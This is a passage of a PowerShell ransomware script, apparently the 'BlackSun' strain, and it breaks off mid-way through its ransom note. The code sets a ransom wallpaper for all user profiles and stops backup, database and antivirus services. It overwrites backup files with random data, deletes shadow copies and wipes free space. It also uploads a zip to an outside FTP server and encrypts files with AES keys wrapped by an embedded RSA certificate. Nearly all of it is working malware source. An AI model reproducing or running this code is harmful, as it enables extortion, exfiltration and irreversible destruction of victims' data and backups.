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'

	$ByteArray = [System.Convert]::FromBase64String($BlackSun);
	[System.IO.File]::WriteAllBytes("c:\users\public\pictures\blacksun.jpg",$ByteArray);

	Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value "c:\users\public\pictures\blacksun.jpg"

	$drive = (Get-Location).Drive.Root
	$users = Get-ChildItem "$($drive)Users"

	foreach ($user in $users) {
		if ($user.Name -ne $env:username) {
			reg.exe LOAD HKU\Temp "$($drive)Users\$($user.Name)\NTUSER.DAT"
			$dir = "Registry::HKEY_USERS\Temp\Control Panel\Desktop"
		} else {
			$dir = "Registry::HKEY_CURRENT_USER\Control Panel\Desktop"
		}
		if ((Test-Path $dir)) {
			Set-ItemProperty -Path $dir -Name "Wallpaper" -Value "$($drive)Users\Public\Pictures\blacksun.jpg"
			Set-ItemProperty -Path $dir -Name "WallpaperStyle" -Value 2

		}
		if ($user.Name -ne $env:username) {
			reg.exe UNLOAD HKU\Temp
		}
	}

	Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@

	$SPI_SETDESKWALLPAPER = 0x0014
	$UpdateIniFile = 0x01
	$SendChangeEvent = 0x02

	$fWinIni = $UpdateIniFile -bor $SendChangeEvent

	$ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER,0,"c:\users\public\pictures\blacksun.jpg",$fWinIni)
}


function WipeFreeSpace ()
{
	param(
		[Parameter(Mandatory = $true)]
		[ValidateNotNullOrEmpty()]
		[string]$strDrive
	)
	Write-Host "Wipe free space on:" $strDrive
	cipher /w:$strDrive
}

function StopServices ()
{
	Write-Host "Stopping backup and Services..."
	Get-Service | Where-Object { $_.Name -ilike "MSexch*" } | Stop-Service | Out-Null
	Get-Service | Where-Object { $_.Name -ilike "*Oracle*" } | Stop-Service | Out-Null
	Get-Process | *outlook* | Stop-Process
	Stop-Service "MSSQLSERVER" -Force | Out-Null
	Stop-Service "MSSQLServerADHelper100" -Force | Out-Null
	Stop-Service "MSSQLServerOLAPService" -Force | Out-Null
	Stop-Service "MySQL57" -Force | Out-Null
	Stop-Service "OracleClientCache80" -Force | Out-Null
	Stop-Service "PDVFSService" -Force | Out-Null
	Stop-Service "POP3Svc" -Force | Out-Null
	Stop-Service "MSSQLServerADHelper" -Force | Out-Null
	Stop-Service "SQLAgent$PROD" -Force | Out-Null
	Stop-Service "msftesql$PROD" -Force | Out-Null
	Stop-Service "NetMsmqActivator" -Force | Out-Null
	Stop-Service "MSSQL$SOPHOS" -Force | Out-Null
	Stop-Service "SQLAgent$SOPHOS" -Force | Out-Null
	Stop-Service "AVP" -Force | Out-Null
	Stop-Service "MSSQL$SQLEXPRESS" -Force | Out-Null
	Stop-Service "SQLAgent$SQLEXPRESS" -Force | Out-Null
	Stop-Service "wbengine" -Force | Out-Null
	Stop-Service "mfefire" -Force | Out-Null
	Stop-Service "ReportServer$SQL_2008" -Force | Out-Null
	Stop-Service "ReportServer$SYSTEM_BGC" -Force | Out-Null
	Stop-Service "ReportServer$TPS" -Force | Out-Null
	Stop-Service "ReportServer$TPSAMA" -Force | Out-Null
	Stop-Service "SAVAdminService" -Force | Out-Null
	Stop-Service "SAVService" -Force | Out-Null
	Stop-Service "SDRSVC" -Force | Out-Null
	Stop-Service "SepMasterService" -Force | Out-Null
	Stop-Service "ShMonitor" -Force | Out-Null
	Stop-Service "Smcinst" -Force | Out-Null
	Stop-Service "SmcService" -Force | Out-Null
	Stop-Service "SMTPSvc" -Force | Out-Null
	Stop-Service "SQLAgent$BKUPEXEC" -Force | Out-Null
	Stop-Service "SQLAgent$ECWDB2" -Force | Out-Null
	Stop-Service "SQLAgent$PRACTTICEBGC" -Force | Out-Null
	Stop-Service "SQLAgent$PRACTTICEMGT" -Force | Out-Null
	Stop-Service "SQLAgent$PROFXENGAGEMENT" -Force | Out-Null
	Stop-Service "SQLAgent$SBSMONITORING" -Force | Out-Null
	Stop-Service "SQLAgent$SHAREPOINT" -Force | Out-Null
	Stop-Service "SQLAgent$SQL_2008" -Force | Out-Null
	Stop-Service "SQLAgent$SYSTEM_BGC" -Force | Out-Null
	Stop-Service "SQLAgent$TPS" -Force | Out-Null
	Stop-Service "SQLAgent$TPSAMA" -Force | Out-Null
	Stop-Service "SQLAgent$VEEAMSQL2008R2" -Force | Out-Null
	Stop-Service "SQLAgent$VEEAMSQL2012" -Force | Out-Null
	Stop-Service "SQLBrowser" -Force | Out-Null
	Stop-Service "SQLSafeOLRService" -Force | Out-Null
	Stop-Service "SQLSERVERAGENT" -Force | Out-Null
	Stop-Service "SQLTELEMETRY" -Force | Out-Null
	Stop-Service "SQLTELEMETRY$ECWDB2" -Force | Out-Null
	Stop-Service "SQLWriter" -Force | Out-Null
	Stop-Service "VeeamBackupSvc" -Force | Out-Null
	Stop-Service "VeeamBrokerSvc" -Force | Out-Null
	Stop-Service "VeeamCatalogSvc" -Force | Out-Null
	Stop-Service "VeeamCloudSvc" -Force | Out-Null
	Stop-Service "VeeamDeploymentService" -Force | Out-Null
	Stop-Service "VeeamDeploySvc" -Force | Out-Null
	Stop-Service "VeeamEnterpriseManagerSvc" -Force | Out-Null
	Stop-Service "VeeamMountSvc" -Force | Out-Null
	Stop-Service "VeeamNFSSvc" -Force | Out-Null
	Stop-Service "VeeamRESTSvc" -Force | Out-Null
	Stop-Service "VeeamTransportSvc" -Force | Out-Null
	Stop-Service "MSSQL$VEEAMSQL2008R2" -Force | Out-Null
	Stop-Service "SQLAgent$VEEAMSQL2008R2" -Force | Out-Null
	Stop-Service "VeeamHvIntegrationSvc" -Force | Out-Null
	Stop-Service "swi_update" -Force | Out-Null
	Stop-Service "SQLAgent$CXDB" -Force | Out-Null
	Stop-Service "SQLAgent$CITRIX_METAFRAME" -Force | Out-Null
	Stop-Service "SQL Backups" -Force | Out-Null
	Stop-Service "MSSQL$PROD" -Force | Out-Null
	Stop-Service "VeeamEndpointBackupSvc" -Force | Out-Null
	Stop-Service "Veeam.Archiver.Service" -Force | Out-Null
	Stop-Service "Veeam.Archiver.Proxy" -Force | Out-Null
	Stop-Service "ManageEngine EventLogAnalyzer 11 - Agent" -Force | Out-Null
	Stop-Service "ManageEngineDataSecurityPlus -AgentService" -Force | Out-Null
	Get-Service | Where-Object { $_.Name -ilike "MSexch*" } | Stop-Service | Out-Null
	[System.GC]::Collect()
}

function DoWaitUntil
{
	Write-Host ""
	$strHour = Get-Date -Format "HH"
	$strMinute = Get-Date -Format "mm"
	$strCurrTime = $strHour + ":" + $strMinute
	Write-Host "boolEncryptGivenTime is true, current time is $strCurrTime waiting till" $strStartTime
	Start-Sleep 1

	do
	{
		$strHour = Get-Date -Format "HH"
		$strMinute = Get-Date -Format "mm"
		$strCurrTime = $strHour + ":" + $strMinute
		Start-Sleep 1
	} until ($strCurrTime -eq $strStartTime)
}

function DoDestroyBackup ()
{
	param(
		[Parameter(Mandatory = $true)]
		[ValidateNotNullOrEmpty()]
		[string]$FileListPath
	)
        foreach($file in [System.IO.File]::ReadLines($FileListPath,[system.text.encoding]::Unicode)) {
		if ($file -eq $null) { break }
		[System.GC]::Collect()
		$check = Get-Item $file
		$sizeKB = [math]::Round($check.Length,2)
		$sizeMB = ($sizeKB / 1024) / 1024
		$sizeMB = [math]::Round($sizeMB,2)

		if ($sizeMB -gt $intMaxRandomDataBackupSizeMB)
		{
			Write-Host "Backup exceed max size, Destroying Backup file:" $file "with" $intMaxRandomDataBackupSizeMB "MB of random data"
			FillRandomBackup -strfilepath $file -sizeMB $intMaxRandomDataBackupSizeMB
			$strNewFileName = $file + ".destroyed"
			Write-Host "Renaming backup file:" $file "in:" $strNewFileName
			Rename-Item -Force -Path $file -NewName $strNewFileName
			Write-Host ""
		} else
		{
			Write-Host "Destroying Backup file:" $file "with" $sizeMB "MB of random data"
			FillRandomBackup -strfilepath $file -sizeMB $sizeMB
			$strNewFileName = $file + ".destroyed"
			Write-Host "Renaming backup file:" $file "in:" $strNewFileName
			Rename-Item -Force -Path $file -NewName $strNewFileName
			Write-Host ""
		}
	}
}

function DoCleanShadows ()
{
	Write-Host "Deleting shadow copies..."
	Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete(); }
}


function FtpUpload ()
{
	param(
		[Parameter(Mandatory = $true)]
		[ValidateNotNullOrEmpty()]
		[string]$ftpFile
	)
	$timestamp = $(((Get-Date).ToUniversalTime()).ToString("yyyyMMddTHHmmssZ"))
	$LogFileName = "$env:computername-$env:userdnsdomain-$timestamp.zip"
	$ftpuri = "ftp://ftpuser:ftppass@ftpserver.net/htdocs/$LogFileName"
	Write-Host $ftpuri
	$webclient = New-Object System.Net.WebClient
	$uri = New-Object System.Uri ($ftpuri)
	$webclient.UploadFile($uri,$ftpFile)
}


$DoEnc = {
	param(
		$FileListPath,$StartLine,$EndLine
	)
    $ErrorActionPreference = "SilentlyContinue"
	$strWorkerLogFile = $env:TEMP + "\BlackSunWorker.log"

	Start-Transcript -IncludeInvocationHeader -Append -Path $strWorkerLogFile

	$process = Get-Process -Id $pid
	$process.PriorityClass = 'AboveNormal'

	$zcvz = 100
	$strPublicCert = $env:TEMP + "\public.cert"

	if (-not (Test-Path -Path $strPublicCert -PathType Leaf))
	{

		$strPublicCertContent = @" 
-----BEGIN CERTIFICATE-----
MIIFfzCCA2egAwIBAgIUaqf2kxVLdz9qFSptaE2p+GqoOdgwDQYJKoZIhvcNAQEL
BQAwTzELMAkGA1UEBhMCREUxCzAJBgNVBAgMAkRFMRAwDgYDVQQHDAdNdW5jaGVu
MSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMjEwODI0MTQx
MzM4WhcNMjIwODI0MTQxMzM4WjBPMQswCQYDVQQGEwJERTELMAkGA1UECAwCREUx
EDAOBgNVBAcMB011bmNoZW4xITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5
IEx0ZDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAMVBaezirMMNELMf
KCuFLQDfZ2bswNo3gqPuKScCSJWdUM3EpUPO30aH+xN53wZ/W5Ea7+Wc4lBbcHJd
rwzI2Rd5bwJ/PQd2DXB92EmeTa0IpL9XOZ3j9HSaLYXkmmhzZz2dXVrBLAp2KtBq
Il+e+kROqL/g9Utbc4GBSp8qXYeYbQ1P7/JnW11yhxj+OkpB9RHvQfckYM+J2Fuo
B0NyhD8T2yG8OV+CpSbxpi+/EnUd22Lj4b8a7rOikpnot2SpXzpE0oZ3mh/DOCdz
jugPYaBmTNVblpm5IGIycvYTTkqGI9APbrfK3PtDePqUAijUo1OsqZqh4Cqz7+oT
4YTjJUkbMtONds4CgtElIYMvCl1qhEcMzZ6l9h2zkWT4w+olMuCHTGtHk7t30rWr
h0mMFdwZ6oR27OpzChGK7G6vjDUstnxRq9mzM03MvTh+S3cO7yKU/TKQJyPkQaUk
Yyqhh0f1rF+FU2hCr4J074CU7Zvo9qrwKIKnffuu/ODelA2gxII8HN2G6dALWRSu
34HOfAGsWTjpya29+i95b/VRaHDj2f9OYwSEM36RoAMQMUDzqlUeXU7mZcRk6ZdG
UfNcgituh69U/TgcwuIQRrqUaF4wXqoXf9Gi25LpHXtKaWN9VubLGi6K9VpKbHvp
/9KybJjEuL3RPlFKws54+7gt/yIPAgMBAAGjUzBRMB0GA1UdDgQWBBTqI3lT1CUI
82gl2q/huO+DN7Jp+TAfBgNVHSMEGDAWgBTqI3lT1CUI82gl2q/huO+DN7Jp+TAP
BgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4ICAQBs77aOmGwcV3T9MFRD
LDcKAZied6rlBVScMKz5fTczO9SJbzsRihfrbpu+EsoMHC7CKntdLK2JLyRXWRdj
+uij0O+N734ap4/tKnvVTc9iEZhLGQSJRjp+FAsFYyAMz9Z1J78WHl2alm/TSEAQ
HufuUidQgsz4JxLLA2nf4mRupnIimaBhHZZOAtjbyI/w7PU4MqmHGGGNO1SLSX84
NrBqgQyXm1g1wDQR+J2l/r+5+naQ8yDDK3pwwiDFhMs6oaiF6UmcF2UoS0paDjeg
QvQCozjUk3/PqI4F4ML5OktYxmkwgUSVlFB/nahycXW3OCThx1w4Uq5Jt0GkTfoa
sSWwKWWi55KZxOXyQBbAa4Kp6WRRwA2JTKvtCUpZW79GxMsPyjfJ/AxHahiNjn7x
rytNrlbm1FoIcNRXLwgKBSQwoOwOCHrXrOvfRZWgnZbwW/5eoMYzDhlogl3KfMUx
eOu4K5NPWkUZ50YArlGZZtZl4Api1xq1sSfnuUSxprka/3kcypVPXwo2T5Ybh7jB
TzWT+ztAj2GuVPCYsFnKMnVRyGndKnpVF+NtPlWipG+tBhPtG25+Udd2vMSex+CM
cDQGnNgls5QcqgV1BbY2UCsefqDXiABkna2r3ta4RMmLfYw3i9AB961IY+WhOSAU
v0P6bfWP7w7I7hP4VVX5afzajg==
-----END CERTIFICATE-----
"@

		$strPublicCertContent | Out-File -FilePath $strPublicCert -Force
	}


	$Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 ($strPublicCert)
	[System.Reflection.Assembly]::LoadWithPartialName("System.Security.Cryptography")
	$AesProvider = New-Object System.Security.Cryptography.AesManaged
	$AesProvider.KeySize = 256
	$AesProvider.BlockSize = 128
	$AesProvider.Mode = [System.Security.Cryptography.CipherMode]::CBC
	$KeyFormatter = New-Object System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter ($Cert.PublicKey.Key)
	[Byte[]]$KeyEncrypted = $KeyFormatter.CreateKeyExchange($AesProvider.Key,$AesProvider.GetType())
	[Byte[]]$LenKey = $Null
	[Byte[]]$LenIV = $Null
	[int]$LKey = $KeyEncrypted.Length
	$LenKey = [System.BitConverter]::GetBytes($LKey)
	[int]$LIV = $AesProvider.IV.Length
	$LenIV = [System.BitConverter]::GetBytes($LIV)

	Get-Content -Encoding Unicode $FileListPath | Select-Object -Index ($StartLine..$EndLine) | ForEach-Object {

		[System.GC]::Collect()

		### checks
		try {
			if (Test-Path -Path $_ -PathType Leaf) {
				$line = Get-Item ($_) }
			else {
				return
			}
		} catch { return }

		try { [io.file]::OpenWrite($line).close() } catch { return }

		$xyx = $line.Length / 1MB
		if ($xyx -gt $zcvz)
		{
			$gghj = $line.FullName + ".BlackSun"; Rename-Item -Path $line.FullName -NewName $gghj; return
		}
		### checks

		$strDirPath = Split-Path $line.FullName
		$strReadmeFile = $strDirPath + "\BlackSun_README.txt"

		try {
			$FileStreamWriter = New-Object System.IO.FileStream ("$($line.FullName)`.BlackSun",[System.IO.FileMode]::Create)
			$FileStreamWriter.Write($LenKey,0,4)
			$FileStreamWriter.Write($LenIV,0,4)
			$FileStreamWriter.Write($KeyEncrypted,0,$LKey)
			$FileStreamWriter.Write($AesProvider.IV,0,$LIV)
			$Transform = $AesProvider.CreateEncryptor()
			$CryptoStream = New-Object System.Security.Cryptography.CryptoStream ($FileStreamWriter,$Transform,[System.Security.Cryptography.CryptoStreamMode]::Write)
			[int]$Count = 0
			[int]$Offset = 0
			#[int]$BlockSizeBytes = $AesProvider.BlockSize / 8
			[int]$BlockSizeBytes = 64000
			[Byte[]]$Data = New-Object Byte[] $BlockSizeBytes
			[int]$BytesRead = 0
			$FileStreamReader = New-Object System.IO.FileStream ("$($line.FullName)",[System.IO.FileMode]::Open)

			do
			{
				$Count = $FileStreamReader.Read($Data,0,$BlockSizeBytes)
				$Offset += $Count
				$CryptoStream.Write($Data,0,$Count)
				$BytesRead += $BlockSizeBytes
			}
			while ($Count -gt 0)
		} catch { return }

		$CryptoStream.FlushFinalBlock()
		$CryptoStream.close()
		$FileStreamReader.close()
		$FileStreamWriter.close()
		$FileStreamReader.Dispose | Out-Null
		$filestreamwriter.Dispose | Out-Null
		$CryptoStream.Dispose | Out-Null

		$strSrc = $line.FullName + ".BlackSun"
		try {
			Copy-Item -Path $strSrc -Destination $line.FullName -Force -ErrorAction SilentlyContinue
			Remove-Item -Path $line.FullName -Force -ErrorAction SilentlyContinue
		} catch { return }

		if (-not (Test-Path -Path $strReadmeFile -PathType Leaf))
		{

			$strReadmeFileContent = @" 
*** BlackSun PROJECT ***

All your data has been encrypted. Documents, photos, databases, backups.

HOW CAN I GET MY DATA BACK?
Your data is not destroyed.
